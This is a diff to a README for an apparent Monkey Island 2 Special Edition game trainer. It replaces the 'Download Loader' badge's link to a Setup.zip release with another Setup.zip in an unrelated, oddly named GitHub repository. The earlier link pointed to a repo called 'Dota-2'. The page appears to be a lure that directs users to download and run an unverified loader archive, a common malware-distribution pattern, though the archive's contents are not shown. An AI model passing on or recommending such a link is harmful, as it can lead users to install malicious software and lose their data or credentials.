@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Monkey Island 2 Special Edition: LeChuck's Revenge Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Monkey-Island-2-Special-Edition-LeChuck-s-Revenge-Trainer` · Updated: 2026-10-26
 
 **Tags:** `monkey-island-2-special-edition-lechucks-revenge` `adventure` `puzzle` `comedy`
+
